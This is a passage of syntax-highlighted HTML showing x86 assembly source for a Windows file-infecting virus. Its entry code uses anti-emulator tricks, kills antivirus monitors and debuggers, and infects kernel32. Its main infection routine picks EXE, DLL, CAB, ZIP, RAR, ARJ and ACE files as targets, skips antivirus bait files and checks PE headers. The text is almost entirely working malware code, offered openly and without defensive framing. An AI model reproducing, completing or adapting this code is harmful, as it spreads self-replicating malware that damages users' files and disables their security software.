</span><span class="sc1">;ÄÄÄ´ virus code starts here ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">virus_start</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_base_ebp</span><span class="sc0">        </span><span class="sc1">;get actual address to EBP</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2Dh</span><span class="sc0">         </span><span class="sc1">;sub eax,infected_ep</span><span class="sc0">
</span><span class="sc5">infected_ep</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00001000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">05h</span><span class="sc0">         </span><span class="sc1">;add eax,original_ep</span><span class="sc0">
</span><span class="sc5">original_ep</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pllg_lsize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;host address</span><span class="sc0">

        </span><span class="sc1">; use anti-emulator</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__anti_e_1</span><span class="sc4">&gt;</span><span class="sc1">;set SEH handler</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0">           </span><span class="sc1">;ehm :)</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__return</span><span class="sc0">
    </span><span class="sc5">__anti_e_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">        </span><span class="sc1">;reset SEH handler</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_kernel32</span><span class="sc0">       </span><span class="sc1">;find kernel's base address</span><span class="sc0">

        </span><span class="sc1">; use anti-emulator</span><span class="sc0">
        </span><span class="sc5">@ANTI_E_START</span><span class="sc0"> </span><span class="sc5">__thread_1_begin</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">__thread_1_finish</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__thread_1</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;thread function</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__thread_1_begin</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> \
                </span><span class="sc4">(</span><span class="sc5">__thread_1_finish</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">__thread_1_begin</span><span class="sc4">)</span><span class="sc0"> \
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">     </span><span class="sc1">;upper imm8 register in EBX</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyCreateThread</span><span class="sc0">    </span><span class="sc1">; * anti-heuristic</span><span class="sc0">
    </span><span class="sc5">__thread_1_begin</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">           </span><span class="sc1">;anti-emulator :)</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__return</span><span class="sc0">        </span><span class="sc1">;patch this ! random number</span><span class="sc0">
    </span><span class="sc5">__thread_1_finish</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc5">@ANTI_E_FINISH</span><span class="sc0"> </span><span class="sc5">__thread_1_begin</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">__thread_1_finish</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; next code...</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">kill_av_monitors</span><span class="sc0">    </span><span class="sc1">;kill AVP, AVAST32 etc.</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">kill_debuggers</span><span class="sc0">      </span><span class="sc1">;bye, bye SoftICE, my honey</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_mutex</span><span class="sc0">        </span><span class="sc1">;already resident ?</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__return</span><span class="sc0">        </span><span class="sc1">;go back, if yes</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypto_startup</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_kernel</span><span class="sc0">       </span><span class="sc1">;ehm, find kernel and infect!</span><span class="sc0">

</span><span class="sc5">__return</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">;go back, my lord...</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ main function for infect file ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This is main function which infects file.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;Extension support:</span><span class="sc0">
        </span><span class="sc1">;    EXE ... executable file (PE), RAR/ACE SFX file</span><span class="sc0">
        </span><span class="sc1">;    DLL ... kernel32 infection, encypting through PHI-API</span><span class="sc0">
        </span><span class="sc1">;    CAB ... infecting Microsoft Cabinet File</span><span class="sc0">
        </span><span class="sc1">;    ZIP/ARJ/RAR/ACE ... dropper compressed,inside archive</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;Okay, here is truth. I had many problems with EXE and DLL</span><span class="sc0">
        </span><span class="sc1">;infection in this function. I found  out  all valuez have</span><span class="sc0">
        </span><span class="sc1">;to be aligned etc. Especially Win2k need that. I also use</span><span class="sc0">
        </span><span class="sc1">;"CheckSumMappedFile" function to calculate appz checksum.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">infect_file</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save registers &amp; get delta</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_base_ebp</span><span class="sc0">

        </span><span class="sc1">; get extension</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; convert lowercase characters to uppercase</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddlstrlen</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get length of filename</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;number of characters to</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;progress</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;filename</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCharUpperBuffA</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;convert to uppercase</span><span class="sc0">

        </span><span class="sc1">; infect only files in these dirz</span><span class="sc0">
    </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">00000000h</span><span class="sc4">],</span><span class="sc12">'W\:C'</span><span class="sc0">  </span><span class="sc1">;"C:\WIN\WEWB4\XX\"</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__if_debug</span><span class="sc0">      </span><span class="sc1">;directory</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">00000004h</span><span class="sc4">],</span><span class="sc12">'W\NI'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__if_debug</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">00000008h</span><span class="sc4">],</span><span class="sc12">'4BWE'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__if_debug</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0000000Ch</span><span class="sc4">],</span><span class="sc13">'\XX\'
</span><span class="sc0">        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__if_debug2</span><span class="sc0">
        </span><span class="sc5">__if_debug</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'W\:C'</span><span class="sc0">        </span><span class="sc1">;"C:\WINDOWS\KERN"</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">infect_file_exit</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">'ODNI'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">infect_file_exit</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc12">'K\SW'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">infect_file_exit</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">'ENRE'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">infect_file_exit</span><span class="sc0">
        </span><span class="sc5">__if_debug2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc1">; check file name (by avoid table)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;filename</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">avoid_table</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;avoid table</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">validate_name</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">infect_file_exit</span><span class="sc0">

        </span><span class="sc1">; check AV files (anti-bait)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fuck_av_files</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">infect_file_exit</span><span class="sc0">

        </span><span class="sc1">; get extension</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">          </span><span class="sc1">;search this char</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">filename_size</span><span class="sc0">    </span><span class="sc1">;max filename_size</span><span class="sc0">
        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">           </span><span class="sc1">;searching...</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;set to that char</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;check again !</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">infect_file_exit</span><span class="sc0">    </span><span class="sc1">;shit, bad last char</span><span class="sc0">

    </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;you can infect only</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'23LE'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__OnlyMyKernel</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'DCBA'</span><span class="sc0">      </span><span class="sc1">;this file on my disk</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">infect_file_exit</span><span class="sc0">    </span><span class="sc1">;i won't risk</span><span class="sc0">
        </span><span class="sc5">__OnlyMyKernel</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">ENDIF</span><span class="sc0">
        </span><span class="sc1">; get file information</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dta</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;dta structure</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;FileName pointer</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyFindFirst</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">infect_file_exit</span><span class="sc0">    </span><span class="sc1">;success ?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyFindClose</span><span class="sc0">       </span><span class="sc1">;close handle</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">it_is_kernel</span><span class="sc4">],</span><span class="sc2">00000001h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">infect_file_continue</span><span class="sc0">    </span><span class="sc1">;if kernel32, infect it</span><span class="sc0">

        </span><span class="sc1">; check extension</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;get ext of file</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'EXE.'</span><span class="sc0">      </span><span class="sc1">;is it EXE file ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">next_ext_1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_ACE_RAR</span><span class="sc0">      </span><span class="sc1">;is it ACE/RAR EXE-SFX file ?</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">infect_file_exit</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next_ext_end</span><span class="sc0">
    </span><span class="sc5">next_ext_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'ECA.'</span><span class="sc0">      </span><span class="sc1">;is it ACE archive file ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">next_ext_2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_ACE</span><span class="sc0">
    </span><span class="sc5">next_ext_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'RAR.'</span><span class="sc0">      </span><span class="sc1">;is it RAR archive file ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">next_ext_3</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_RAR</span><span class="sc0">
    </span><span class="sc5">next_ext_3</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'JRA.'</span><span class="sc0">      </span><span class="sc1">;is it ARJ archive file ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">next_ext_4</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_ARJ</span><span class="sc0">
    </span><span class="sc5">next_ext_4</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'PIZ.'</span><span class="sc0">      </span><span class="sc1">;is it ZIP archive file ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">next_ext_5</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_ZIP</span><span class="sc0">
    </span><span class="sc5">next_ext_5</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'BAC.'</span><span class="sc0">      </span><span class="sc1">;is it CAB archive file ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">infect_file_exit</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_CAB</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">infect_file_exit</span><span class="sc0">
    </span><span class="sc5">next_ext_end</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;infect if any EXE file</span><span class="sc0">

        </span><span class="sc1">; check number of infected files</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewACE.dropper</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">infect_file_continue</span><span class="sc0">    </span><span class="sc1">;dropper exists ?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_infected</span><span class="sc4">],</span><span class="sc2">20</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">infect_file_exit</span><span class="sc0">    </span><span class="sc1">;infected more then 20 EXEs ?</span><span class="sc0">

        </span><span class="sc1">; check file size</span><span class="sc0">
    </span><span class="sc5">infect_file_continue</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dta.dta_filesize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">infect_minsize</span><span class="sc0">  </span><span class="sc1">;is filesize smaller ?</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">infect_file_exit</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">infect_maxsize</span><span class="sc0">  </span><span class="sc1">;is filesize bigger ?</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">infect_file_exit</span><span class="sc0">

        </span><span class="sc1">; set file attributes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MySetAttrFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">infect_file_exit</span><span class="sc0">    </span><span class="sc1">;success ?</span><span class="sc0">

        </span><span class="sc1">; open file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyOpenFile</span><span class="sc0">        </span><span class="sc1">;open file !</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">infect_file_restattr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_handle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; create a memory map object</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;name of file mapping object</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;low 32 bits of object size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;high 32 bits of object size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READONLY</span><span class="sc0">       </span><span class="sc1">;get needed valuez, etc.</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;optional security attributes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_handle</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;handle to file to map</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCreateFileMappingA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;failed ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">infect_file_close</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_hmap</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;store mapped file handle</span><span class="sc0">

        </span><span class="sc1">; view of file in our address</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;number of bytes to map</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;low 32 bits of the offset</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;high 32 bits of the offset</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_MAP_READ</span><span class="sc0">       </span><span class="sc1">;access mode</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_hmap</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;mapped file handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddMapViewOfFile</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;failed ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">infect_file_closeMap</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_hmem</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;mapped file in memory</span><span class="sc0">

        </span><span class="sc1">; check file signature</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.MZ_magic</span><span class="sc4">],</span><span class="sc0"> \
            </span><span class="sc5">IMAGE_DOS_SIGNATURE</span><span class="sc0"> </span><span class="sc1">;test 'MZ'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">infect_file_unMap</span><span class="sc0">

        </span><span class="sc1">; check "PE" valuez</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.MZ_crlc</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">infect_file_okay</span><span class="sc0">    </span><span class="sc1">;no PE ?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.MZ_lfarlc</span><span class="sc4">],</span><span class="sc2">0040h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">infect_file_unMap</span><span class="sc0">   </span><span class="sc1">;bad PE ?</span><span class="sc0">

    </span><span class="sc5">infect_file_okay</span><span class="sc4">:</span><span class="sc0">
